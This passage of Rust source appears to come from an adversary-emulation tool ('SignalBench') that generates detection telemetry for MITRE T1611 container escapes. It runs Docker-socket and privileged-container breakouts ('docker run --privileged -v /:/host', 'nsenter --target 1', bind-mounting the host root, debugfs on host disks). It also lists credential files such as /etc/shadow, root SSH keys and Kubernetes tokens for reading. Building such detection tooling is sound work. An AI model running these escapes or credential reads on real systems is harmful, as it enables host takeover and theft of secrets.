                        "echo -e 'GET /version HTTP/1.0\\r\\n\\r\\n' | socat - UNIX-CONNECT:{} 2>/dev/null | head -20",
                        socket_path
                    )])
                    .output()
                    .await;
                
                if let Ok(output) = socat_output {
                    if output.status.success() {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        if stdout.contains("HTTP") || stdout.contains("ApiVersion") {
                            findings.push("[EXEC] socat to docker.sock - SUCCESS".to_string());
                        }
                    }
                }
            } else {
                findings.push(format!("[SAFE] Docker socket not found at: {}", socket_path));
                debug!("[T1611-SOCK] No Docker socket at primary path - checking alternatives");
                
                // Check alternative socket locations
                if let Some(alt_socket) = check_docker_socket_with_prefix("T1611-SOCK") {
                    findings.push(format!("[WARNING] Alternative socket found: {}", alt_socket));
                }
            }
            
            // Write escape script with all commands (for detection telemetry)
            let script_file = format!("{}/escape_commands.sh", output_dir);
            if let Ok(mut f) = File::create(&script_file) {
                let script_content = format!(
                    r#"#!/bin/bash
# SignalBench T1611-SOCK - Docker Socket Escape Commands
# This script contains the actual commands executed for telemetry generation

# Docker CLI enumeration
docker version --format json
docker info --format json
docker ps -a --format json
docker images --format json
docker network ls --format json

# Docker API access via socket
curl --unix-socket {} http://localhost/version
curl --unix-socket {} http://localhost/containers/json
curl --unix-socket {} http://localhost/images/json
curl --unix-socket {} http://localhost/info

# Privileged container escape attempt
docker run --rm --privileged --pid=host --net=host -v /:/host alpine:latest id
docker run --rm --privileged -v /:/host alpine:latest chroot /host cat /etc/hostname

# Alternative socket access
echo -e 'GET /version HTTP/1.0\r\n\r\n' | socat - UNIX-CONNECT:{}
"#,
                    socket_path, socket_path, socket_path, socket_path, socket_path
                );
                let _ = f.write_all(script_content.as_bytes());
                artefacts.push(script_file);
            }
            
            // Write findings report
            let report_file = format!("{}/socket_escape_report.txt", output_dir);
            if let Ok(mut f) = File::create(&report_file) {
                let report = format!(
                    "SignalBench T1611-SOCK - Docker Socket Escape Report\n{}\n\nContainer Environment:\n  Is Container: {}\n  Runtime: {:?}\n  Container ID: {:?}\n  Hostname: {:?}\n\nFindings:\n{}\n",
                    "=".repeat(50),
                    container_env.is_container,
                    container_env.runtime,
                    container_env.container_id,
                    container_env.hostname,
                    findings.join("\n")
                );
                let _ = f.write_all(report.as_bytes());
                artefacts.push(report_file);
            }
            
            let escape_possible = socket_exists;
            let message = if escape_possible {
                format!("Docker socket escape vector detected at {} - {} findings recorded", socket_path, findings.len())
            } else if force_mode {
                format!("Force mode: Docker socket escape operations attempted - {} checks performed", findings.len())
            } else {
                format!("No Docker socket escape vector found - {} checks performed", findings.len())
            };
            
            info!("[T1611-SOCK] Technique complete: {}", message);
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message,
                artifacts: artefacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artefacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            debug!("[T1611-SOCK] Starting cleanup of {} artefacts", artefacts.len());
            
            for artefact in artefacts {
                // Special handling for host marker files created via docker
                if artefact == "/tmp/signalbench_escape_marker" {
                    debug!("[T1611-SOCK] Removing host marker file via docker");
                    // Remove the marker file via a privileged container
                    let cleanup_result = Command::new("docker")
                        .args([
                            "run", "--rm",
                            "-v", "/:/host",
                            "alpine:latest",
                            "rm", "-f", "/host/tmp/signalbench_escape_marker"
                        ])
                        .output()
                        .await;
                    
                    match cleanup_result {
                        Ok(output) => {
                            if output.status.success() {
                                info!("[T1611-SOCK] Removed host marker file: {}", artefact);
                            } else {
                                // Fallback: try local removal (if running on host)
                                if let Err(e) = fs::remove_file(artefact) {
                                    warn!("[T1611-SOCK] Failed to remove host marker {}: {}", artefact, e);
                                }
                            }
                        }
                        Err(_) => {
                            // Fallback: try local removal
                            if let Err(e) = fs::remove_file(artefact) {
                                debug!("[T1611-SOCK] Could not remove host marker {}: {}", artefact, e);
                            }
                        }
                    }
                    continue;
                }
                
                let path = Path::new(artefact);
                if path.is_dir() {
                    debug!("[T1611-SOCK] Removing directory: {}", artefact);
                    if let Err(e) = fs::remove_dir_all(path) {
                        warn!("[T1611-SOCK] Failed to remove directory {}: {}", artefact, e);
                    }
                } else if path.is_file() {
                    debug!("[T1611-SOCK] Removing file: {}", artefact);
                    if let Err(e) = fs::remove_file(path) {
                        warn!("[T1611-SOCK] Failed to remove file {}: {}", artefact, e);
                    }
                }
            }
            
            info!("[T1611-SOCK] Cleanup complete");
            Ok(())
        })
    }
}

// =============================================================================
// T1611-PRIV: Privileged Container Escape
// =============================================================================

pub struct PrivilegedContainerEscape {}

#[async_trait]
impl AttackTechnique for PrivilegedContainerEscape {
    fn info(&self) -> Technique {
        Technique {
            id: "T1611-PRIV".to_string(),
            name: "Privileged Container Escape".to_string(),
            description: "Privileged container escape via dangerous capabilities. Runs capsh --print, fdisk -l, lsblk, blkid, mount -t tmpfs, mount --bind, nsenter --target 1, debugfs, getcap, and setcap commands. Enumerates dangerous Linux capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE, CAP_NET_ADMIN), attempts mount operations, namespace escapes, and host device access. Based on Unit42 research on container breakout techniques.".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "output_dir".to_string(),
                    description: "Directory for capability enumeration output".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_priv_escape".to_string()),
                },
                TechniqueParameter {
                    name: "test_mount".to_string(),
                    description: "Attempt real mount operations (mount -t tmpfs, mount --bind)".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "test_nsenter".to_string(),
                    description: "Attempt nsenter into host namespaces".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Monitor for: capsh execution, mount syscalls (mount -t tmpfs, mount --bind), nsenter commands, fdisk/lsblk/blkid/debugfs execution, getcap/setcap commands, /dev block device access, namespace escape attempts.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let output_dir = config
                .parameters
                .get("output_dir")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_priv_escape".to_string());
            
            let test_mount = config
                .parameters
                .get("test_mount")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            debug!("[T1611-PRIV] Starting Privileged Container Escape technique");
            debug!("[T1611-PRIV] Output directory: {}", output_dir);
            debug!("[T1611-PRIV] Test mount operations: {}", test_mount);
            
            let mut artefacts = Vec::new();
            let mut findings = Vec::new();
            let mut dangerous_caps = Vec::new();
            
            // Parse capabilities
            let caps = parse_capabilities_with_prefix("T1611-PRIV");
            debug!("[T1611-PRIV] Effective capabilities: 0x{:016x}", caps.cap_effective);
            
            let test_nsenter = config
                .parameters
                .get("test_nsenter")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            if dry_run {
                info!("[DRY RUN] Would perform Privileged Container Escape:");
                info!("[DRY RUN] - Execute: capsh --print");
                info!("[DRY RUN] - Execute: fdisk -l");
                info!("[DRY RUN] - Execute: lsblk -a");
                info!("[DRY RUN] - Execute: blkid");
                info!("[DRY RUN] - Execute: getcap -r /");
                if test_mount {
                    info!("[DRY RUN] - Execute: mount -t tmpfs tmpfs /tmp/signalbench_mnt");
                    info!("[DRY RUN] - Execute: mount --bind / /tmp/signalbench_bind");
                }
                if test_nsenter {
                    info!("[DRY RUN] - Execute: nsenter --target 1 --mount --uts --ipc --net --pid");
                }
                info!("[DRY RUN] - Execute: debugfs (if available)");
                info!("[DRY RUN] - Write findings to: {}", output_dir);
                
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would perform privileged container escape".to_string(),
                    artifacts: vec![output_dir],
                    cleanup_required: false,
                });
            }
            
            // Create output directory
            debug!("[T1611-PRIV] Creating output directory");
            if let Err(e) = fs::create_dir_all(&output_dir) {
                warn!("[T1611-PRIV] Failed to create output directory: {}", e);
            } else {
                artefacts.push(output_dir.clone());
            }
            
            // Create test mount directory
            let mount_dir = format!("{}/mnt_test", output_dir);
            let _ = fs::create_dir_all(&mount_dir);
            
            // Check for dangerous capabilities
            let cap_checks = [
                (CAP_SYS_ADMIN, "CAP_SYS_ADMIN", "Full container escape, mount filesystems, trace processes"),
                (CAP_SYS_PTRACE, "CAP_SYS_PTRACE", "Debug/trace any process, inject code into host processes"),
                (CAP_SYS_MODULE, "CAP_SYS_MODULE", "Load kernel modules, rootkit installation"),
                (CAP_NET_ADMIN, "CAP_NET_ADMIN", "Network namespace escape, packet capture"),
                (CAP_DAC_OVERRIDE, "CAP_DAC_OVERRIDE", "Bypass file read/write permission checks"),
                (CAP_DAC_READ_SEARCH, "CAP_DAC_READ_SEARCH", "Bypass file read permission and directory search"),
                (CAP_SYS_RAWIO, "CAP_SYS_RAWIO", "Raw I/O port access, direct disk access"),
                (CAP_MKNOD, "CAP_MKNOD", "Create device nodes, access host devices"),
            ];
            
            for (cap_bit, cap_name, cap_desc) in &cap_checks {
                if has_capability(&caps, *cap_bit) {
                    let finding = format!("[CRITICAL] {} present - {}", cap_name, cap_desc);
                    findings.push(finding.clone());
                    dangerous_caps.push(cap_name.to_string());
                    info!("[T1611-PRIV] {}", finding);
                } else {
                    debug!("[T1611-PRIV] {} not present", cap_name);
                }
            }
            
            // Detect --privileged mode (all caps + no seccomp)
            let is_privileged = caps.cap_effective == 0x3FFFFFFFFF || // All 38 capabilities
                                (has_capability(&caps, CAP_SYS_ADMIN) && 
                                 has_capability(&caps, CAP_SYS_PTRACE) &&
                                 has_capability(&caps, CAP_SYS_MODULE));
            
            if is_privileged {
                findings.push("[CRITICAL] Container appears to be running with --privileged flag".to_string());
                info!("[T1611-PRIV] [CRITICAL] Privileged container detected");
            }
            
            // =========================================================
            // Execute commands for telemetry
            // =========================================================
            
            // 1. capsh --print - Capability shell print
            info!("[T1611-PRIV] Executing: capsh --print");
            let capsh_output = Command::new("capsh")
                .args(["--print"])
                .output()
                .await;
            
            match capsh_output {
                Ok(output) => {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    if output.status.success() {
                        findings.push("[EXEC] capsh --print - SUCCESS".to_string());
                        let capsh_file = format!("{}/capsh_print.txt", output_dir);
                        if let Ok(mut f) = File::create(&capsh_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(capsh_file);
                        }
                    } else {
                        findings.push(format!("[EXEC] capsh --print - FAILED: {}", stderr.trim()));
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] capsh --print - ERROR: {}", e));
                }
            }
            
            // 2. fdisk -l - List disk partitions
            info!("[T1611-PRIV] Executing: fdisk -l");
            let fdisk_output = Command::new("fdisk")
                .args(["-l"])
                .output()
                .await;
            
            match fdisk_output {
                Ok(output) => {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    if output.status.success() {
                        findings.push("[EXEC] fdisk -l - SUCCESS (disk layout exposed)".to_string());
                        let fdisk_file = format!("{}/fdisk_output.txt", output_dir);
                        if let Ok(mut f) = File::create(&fdisk_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(fdisk_file);
                        }
                    } else {
                        findings.push(format!("[EXEC] fdisk -l - FAILED: {}", stderr.trim()));
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] fdisk -l - ERROR: {}", e));
                }
            }
            
            // 3. lsblk -a - List all block devices
            info!("[T1611-PRIV] Executing: lsblk -a");
            let lsblk_output = Command::new("lsblk")
                .args(["-a", "-o", "NAME,SIZE,TYPE,MOUNTPOINT,FSTYPE"])
                .output()
                .await;
            
            match lsblk_output {
                Ok(output) => {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    if output.status.success() {
                        findings.push("[EXEC] lsblk -a - SUCCESS".to_string());
                        let lsblk_file = format!("{}/lsblk_output.txt", output_dir);
                        if let Ok(mut f) = File::create(&lsblk_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(lsblk_file);
                        }
                    } else {
                        findings.push(format!("[EXEC] lsblk -a - FAILED: {}", stderr.trim()));
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] lsblk -a - ERROR: {}", e));
                }
            }
            
            // 4. blkid - Block device attributes
            info!("[T1611-PRIV] Executing: blkid");
            let blkid_output = Command::new("blkid")
                .output()
                .await;
            
            match blkid_output {
                Ok(output) => {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    if output.status.success() {
                        findings.push("[EXEC] blkid - SUCCESS (device UUIDs exposed)".to_string());
                        let blkid_file = format!("{}/blkid_output.txt", output_dir);
                        if let Ok(mut f) = File::create(&blkid_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(blkid_file);
                        }
                    } else {
                        findings.push(format!("[EXEC] blkid - FAILED: {}", stderr.trim()));
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] blkid - ERROR: {}", e));
                }
            }
            
            // 5. getcap -r / - Enumerate all capabilities on filesystem
            info!("[T1611-PRIV] Executing: getcap -r /usr");
            let getcap_output = Command::new("getcap")
                .args(["-r", "/usr"])
                .output()
                .await;
            
            match getcap_output {
                Ok(output) => {
                    if output.status.success() || !output.stdout.is_empty() {
                        findings.push("[EXEC] getcap -r /usr - SUCCESS".to_string());
                        let getcap_file = format!("{}/getcap_output.txt", output_dir);
                        if let Ok(mut f) = File::create(&getcap_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(getcap_file);
                        }
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] getcap - ERROR: {}", e));
                }
            }
            
            // 6. id -nG - Check group membership
            info!("[T1611-PRIV] Executing: id");
            let id_output = Command::new("id")
                .output()
                .await;
            
            match id_output {
                Ok(output) => {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    findings.push(format!("[EXEC] id - {}", stdout.trim()));
                    
                    if stdout.contains("docker") {
                        findings.push("[WARNING] User is member of docker group - can control Docker daemon".to_string());
                    }
                    if stdout.contains("root") || stdout.contains("(0)") {
                        findings.push("[CRITICAL] Running as root".to_string());
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] id - ERROR: {}", e));
                }
            }
            
            // Attempt mount operations
            if test_mount {
                // 7. mount -t tmpfs - Attempt to mount tmpfs
                info!("[T1611-PRIV] Executing: mount -t tmpfs tmpfs {}", mount_dir);
                let mount_tmpfs = Command::new("mount")
                    .args(["-t", "tmpfs", "tmpfs", &mount_dir])
                    .output()
                    .await;
                
                match mount_tmpfs {
                    Ok(output) => {
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        if output.status.success() {
                            findings.push("[CRITICAL] mount -t tmpfs - SUCCESS (can mount filesystems!)".to_string());
                            // Unmount after success
                            let _ = Command::new("umount").args([&mount_dir]).output().await;
                        } else {
                            findings.push(format!("[EXEC] mount -t tmpfs - BLOCKED: {}", stderr.trim()));
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] mount -t tmpfs - ERROR: {}", e));
                    }
                }
                
                // 8. mount --bind - Attempt bind mount of root
                info!("[T1611-PRIV] Executing: mount --bind / {}", mount_dir);
                let mount_bind = Command::new("mount")
                    .args(["--bind", "/", &mount_dir])
                    .output()
                    .await;
                
                match mount_bind {
                    Ok(output) => {
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        if output.status.success() {
                            findings.push("[CRITICAL] mount --bind / - SUCCESS (host filesystem accessible!)".to_string());
                            // List what we can see
                            if let Ok(ls_output) = Command::new("ls").args(["-la", &mount_dir]).output().await {
                                if ls_output.status.success() {
                                    findings.push("[ESCAPE] Host root accessible via bind mount".to_string());
                                }
                            }
                            // Unmount after success
                            let _ = Command::new("umount").args([&mount_dir]).output().await;
                        } else {
                            findings.push(format!("[EXEC] mount --bind / - BLOCKED: {}", stderr.trim()));
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] mount --bind / - ERROR: {}", e));
                    }
                }
                
                // 9. Check for accessible host devices
                let dev_paths = ["/dev/sda", "/dev/sda1", "/dev/xvda", "/dev/xvda1", "/dev/nvme0n1", "/dev/vda"];
                for dev in &dev_paths {
                    if Path::new(dev).exists() {
                        findings.push(format!("[WARNING] Host block device accessible: {}", dev));
                        
                        // Try debugfs on device
                        info!("[T1611-PRIV] Executing: debugfs -R 'ls -l /' {}", dev);
                        let debugfs_output = Command::new("debugfs")
                            .args(["-R", "ls -l /", dev])
                            .output()
                            .await;
                        
                        if let Ok(output) = debugfs_output {
                            if output.status.success() {
                                findings.push(format!("[CRITICAL] debugfs {} - SUCCESS (raw disk access!)", dev));
                            }
                        }
                    }
                }
            }
            
            // Attempt namespace escape
            let host_marker_path: &str = "/tmp/signalbench_priv_escape_marker";
            let mut nsenter_succeeded = false;
            
            if test_nsenter {
                // 10. nsenter --target 1 - Escape to host namespaces
                info!("[T1611-PRIV] Executing: nsenter --target 1 --mount --uts --ipc --net --pid -- id");
                let nsenter_output = Command::new("nsenter")
                    .args(["--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "id"])
                    .output()
                    .await;
                
                match nsenter_output {
                    Ok(output) => {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        if output.status.success() {
                            findings.push(format!("[CRITICAL] nsenter --target 1 - SUCCESS: {}", stdout.trim()));
                            findings.push("[ESCAPE] Full namespace escape to host achieved!".to_string());
                            nsenter_succeeded = true;
                        } else {
                            findings.push(format!("[EXEC] nsenter --target 1 - BLOCKED: {}", stderr.trim()));
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] nsenter --target 1 - ERROR: {}", e));
                    }
                }
                
                // 10b. If nsenter succeeded, create a marker file on the host to prove escape
                if nsenter_succeeded {
                    info!("[T1611-PRIV] Creating host marker file via nsenter");
                    let marker_cmd = format!(
                        "touch {} && echo 'SignalBench T1611-PRIV escape marker - created at '$(date) > {}",
                        host_marker_path, host_marker_path
                    );
                    let marker_output = Command::new("nsenter")
                        .args(["--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "sh", "-c", &marker_cmd])
                        .output()
                        .await;
                    
                    match marker_output {
                        Ok(output) => {
                            if output.status.success() {
                                findings.push(format!("[ESCAPE] Host marker file created: {}", host_marker_path));
                                findings.push("[ESCAPE] Container escape to host filesystem CONFIRMED!".to_string());
                                artefacts.push(host_marker_path.to_string());
                                info!("[T1611-PRIV] [CRITICAL] Marker file created on host via nsenter");
                            } else {
                                let stderr = String::from_utf8_lossy(&output.stderr);
                                findings.push(format!("[EXEC] marker creation - BLOCKED: {}", stderr.trim()));
                            }
                        }
                        Err(e) => {
                            findings.push(format!("[EXEC] marker creation - ERROR: {}", e));
                        }
                    }
                    
                    // Verify marker file exists
                    let verify_output = Command::new("nsenter")
                        .args(["--target", "1", "--mount", "--", "cat", host_marker_path])
                        .output()
                        .await;
                    
                    if let Ok(output) = verify_output {
                        if output.status.success() {
                            let content = String::from_utf8_lossy(&output.stdout);
                            findings.push(format!("[VERIFIED] Host marker content: {}", content.trim()));
                            debug!("[T1611-PRIV] Marker file verified on host");
                        }
                    }
                }
                
                // Also try individual namespace escapes
                for ns_type in &["--mount", "--pid", "--net", "--uts", "--ipc"] {
                    info!("[T1611-PRIV] Executing: nsenter --target 1 {} -- cat /etc/hostname", ns_type);
                    let ns_output = Command::new("nsenter")
                        .args(["--target", "1", ns_type, "--", "cat", "/etc/hostname"])
                        .output()
                        .await;
                    
                    if let Ok(output) = ns_output {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        if output.status.success() {
                            findings.push(format!("[CRITICAL] nsenter {} - SUCCESS: {}", ns_type, stdout.trim()));
                        }
                    }
                }
            }
            
            // Write capabilities dump
            let caps_file = format!("{}/capabilities.txt", output_dir);
            if let Ok(mut f) = File::create(&caps_file) {
                let caps_dump = format!(
                    "Linux Capabilities Dump\n{}\nCapEff: 0x{:016x}\nCapPrm: 0x{:016x}\nCapInh: 0x{:016x}\nCapBnd: 0x{:016x}\nCapAmb: 0x{:016x}\n\nDangerous Capabilities Present:\n{}\n",
                    "=".repeat(30),
                    caps.cap_effective,
                    caps.cap_permitted,
                    caps.cap_inheritable,
                    caps.cap_bounding,
                    caps.cap_ambient,
                    if dangerous_caps.is_empty() { "None".to_string() } else { dangerous_caps.join(", ") }
                );
                let _ = f.write_all(caps_dump.as_bytes());
                artefacts.push(caps_file);
            }
            
            // Write findings report
            let report_file = format!("{}/privileged_escape_report.txt", output_dir);
            if let Ok(mut f) = File::create(&report_file) {
                let container_env = detect_container_environment_with_prefix("T1611-PRIV");
                let report = format!(
                    "SignalBench T1611-PRIV - Privileged Container Escape Report\n{}\n\nContainer Environment:\n  Is Container: {}\n  Runtime: {:?}\n  Privileged Mode: {}\n\nFindings:\n{}\n",
                    "=".repeat(55),
                    container_env.is_container,
                    container_env.runtime,
                    is_privileged,
                    findings.join("\n")
                );
                let _ = f.write_all(report.as_bytes());
                artefacts.push(report_file);
            }
            
            let escape_possible = !dangerous_caps.is_empty() || is_privileged;
            let message = if escape_possible {
                format!("Privileged container escape vectors detected: {} dangerous capabilities found", dangerous_caps.len())
            } else {
                "No privileged container escape vectors detected - container appears properly restricted".to_string()
            };
            
            info!("[T1611-PRIV] Technique complete: {}", message);
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message,
                artifacts: artefacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artefacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            debug!("[T1611-PRIV] Starting cleanup of {} artefacts", artefacts.len());
            
            for artefact in artefacts {
                // Special handling for host marker files created via nsenter
                if artefact == "/tmp/signalbench_priv_escape_marker" {
                    debug!("[T1611-PRIV] Removing host marker file via nsenter");
                    // Remove the marker file via nsenter into host namespace
                    let cleanup_result = Command::new("nsenter")
                        .args(["--target", "1", "--mount", "--", "rm", "-f", artefact])
                        .output()
                        .await;
                    
                    match cleanup_result {
                        Ok(output) => {
                            if output.status.success() {
                                info!("[T1611-PRIV] Removed host marker file: {}", artefact);
                            } else {
                                // Fallback: try local removal (if running on host)
                                if let Err(e) = fs::remove_file(artefact) {
                                    warn!("[T1611-PRIV] Failed to remove host marker {}: {}", artefact, e);
                                }
                            }
                        }
                        Err(_) => {
                            // Fallback: try local removal
                            if let Err(e) = fs::remove_file(artefact) {
                                debug!("[T1611-PRIV] Could not remove host marker {}: {}", artefact, e);
                            }
                        }
                    }
                    continue;
                }
                
                let path = Path::new(artefact);
                if path.is_dir() {
                    debug!("[T1611-PRIV] Removing directory: {}", artefact);
                    if let Err(e) = fs::remove_dir_all(path) {
                        warn!("[T1611-PRIV] Failed to remove directory {}: {}", artefact, e);
                    }
                } else if path.is_file() {
                    debug!("[T1611-PRIV] Removing file: {}", artefact);
                    if let Err(e) = fs::remove_file(path) {
                        warn!("[T1611-PRIV] Failed to remove file {}: {}", artefact, e);
                    }
                }
            }
            
            info!("[T1611-PRIV] Cleanup complete");
            Ok(())
        })
    }
}

// =============================================================================
// T1611-MOUNT: Sensitive Mount Escape
// =============================================================================

pub struct SensitiveMountEscape {}

#[async_trait]
impl AttackTechnique for SensitiveMountEscape {
    fn info(&self) -> Technique {
        Technique {
            id: "T1611-MOUNT".to_string(),
            name: "Sensitive Mount Escape".to_string(),
            description: "Sensitive mount escape via host filesystem access. Runs findmnt, df -h, mount --bind, cat /etc/shadow, cat /etc/passwd, ls -la /root, and touch/write tests on mounted paths. Enumerates mount points for host paths (/etc, /var/run, /root, /), block device mounts, and writable host directories. Attempts file reads and writes on mounted paths.".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "output_dir".to_string(),
                    description: "Directory for mount enumeration output".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_mount_escape".to_string()),
                },
                TechniqueParameter {
                    name: "test_read".to_string(),
                    description: "Attempt to read sensitive files (cat /etc/shadow, etc)".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "test_write".to_string(),
                    description: "Attempt write operations on mounted paths".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Monitor for: findmnt/df/mount commands, cat /etc/shadow execution, touch/echo commands on host paths, ls -la on /root or /etc, mount --bind attempts from containers.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let output_dir = config
                .parameters
                .get("output_dir")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_mount_escape".to_string());
            
            let test_read = config
                .parameters
                .get("test_read")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            debug!("[T1611-MOUNT] Starting Sensitive Mount Escape technique");
            debug!("[T1611-MOUNT] Output directory: {}", output_dir);
            debug!("[T1611-MOUNT] Test read operations: {}", test_read);
            
            let mut artefacts = Vec::new();
            let mut findings = Vec::new();
            let mut sensitive_mounts = Vec::new();
            
            let test_write = config
                .parameters
                .get("test_write")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            if dry_run {
                info!("[DRY RUN] Would perform Sensitive Mount Escape:");
                info!("[DRY RUN] - Execute: findmnt --all");
                info!("[DRY RUN] - Execute: df -h");
                info!("[DRY RUN] - Execute: mount");
                if test_read {
                    info!("[DRY RUN] - Execute: cat /etc/shadow");
                    info!("[DRY RUN] - Execute: cat /etc/passwd");
                    info!("[DRY RUN] - Execute: ls -la /root");
                    info!("[DRY RUN] - Execute: cat /root/.ssh/id_rsa");
                }
                if test_write {
                    info!("[DRY RUN] - Execute: touch /etc/signalbench_test");
                    info!("[DRY RUN] - Execute: mount --bind / /tmp/signalbench_bind");
                }
                info!("[DRY RUN] - Write findings to: {}", output_dir);
                
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would perform sensitive mount escape".to_string(),
                    artifacts: vec![output_dir],
                    cleanup_required: false,
                });
            }
            
            // Create output directory
            debug!("[T1611-MOUNT] Creating output directory");
            if let Err(e) = fs::create_dir_all(&output_dir) {
                warn!("[T1611-MOUNT] Failed to create output directory: {}", e);
            } else {
                artefacts.push(output_dir.clone());
            }
            
            // =========================================================
            // Execute commands for telemetry
            // =========================================================
            
            // 1. findmnt --all - List all mount points
            info!("[T1611-MOUNT] Executing: findmnt --all");
            let findmnt_output = Command::new("findmnt")
                .args(["--all", "-o", "TARGET,SOURCE,FSTYPE,OPTIONS"])
                .output()
                .await;
            
            match findmnt_output {
                Ok(output) => {
                    if output.status.success() {
                        findings.push("[EXEC] findmnt --all - SUCCESS".to_string());
                        let findmnt_file = format!("{}/findmnt_output.txt", output_dir);
                        if let Ok(mut f) = File::create(&findmnt_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(findmnt_file);
                        }
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] findmnt --all - ERROR: {}", e));
                }
            }
            
            // 2. df -h - Disk space usage
            info!("[T1611-MOUNT] Executing: df -h");
            let df_output = Command::new("df")
                .args(["-h"])
                .output()
                .await;
            
            match df_output {
                Ok(output) => {
                    if output.status.success() {
                        findings.push("[EXEC] df -h - SUCCESS".to_string());
                        let df_file = format!("{}/df_output.txt", output_dir);
                        if let Ok(mut f) = File::create(&df_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(df_file);
                        }
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] df -h - ERROR: {}", e));
                }
            }
            
            // 3. mount - Show all mounts
            info!("[T1611-MOUNT] Executing: mount");
            let mount_output = Command::new("mount")
                .output()
                .await;
            
            match mount_output {
                Ok(output) => {
                    if output.status.success() {
                        findings.push("[EXEC] mount - SUCCESS".to_string());
                        let mount_file = format!("{}/mount_output.txt", output_dir);
                        if let Ok(mut f) = File::create(&mount_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(mount_file);
                        }
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] mount - ERROR: {}", e));
                }
            }
            
            // Enumerate mount points programmatically
            let mounts = enumerate_mounts_with_prefix("T1611-MOUNT");
            debug!("[T1611-MOUNT] Found {} mount points", mounts.len());
            
            // Analyse each mount
            for mount in &mounts {
                if is_sensitive_mount(mount) {
                    let finding = format!(
                        "[WARNING] Sensitive mount: {} -> {} ({})",
                        mount.source, mount.target, mount.fstype
                    );
                    findings.push(finding.clone());
                    sensitive_mounts.push(mount.clone());
                    info!("[T1611-MOUNT] {}", finding);
                    
                    if !mount.options.contains("ro") {
                        findings.push(format!("  [CRITICAL] Mount is writable: {}", mount.target));
                    }
                }
            }
            
            // Check for host root mount
            let root_mount = mounts.iter().find(|m| m.target == "/" && m.source.starts_with("/dev/"));
            if let Some(mount) = root_mount {
                if mount.source.contains("sda") || mount.source.contains("xvda") || mount.source.contains("nvme") {
                    findings.push(format!("[CRITICAL] Host root filesystem appears mounted: {} -> /", mount.source));
                }
            }
            
            // Execute cat commands on sensitive files
            if test_read {
                let sensitive_files = [
                    ("/etc/shadow", "Password hashes"),
                    ("/etc/passwd", "User accounts"),
                    ("/etc/sudoers", "Sudo configuration"),
                    ("/root/.ssh/id_rsa", "SSH private key"),
                    ("/root/.bash_history", "Root command history"),
                    ("/etc/ssh/sshd_config", "SSH server config"),
                    ("/var/run/secrets/kubernetes.io/serviceaccount/token", "K8s token"),
                ];
                
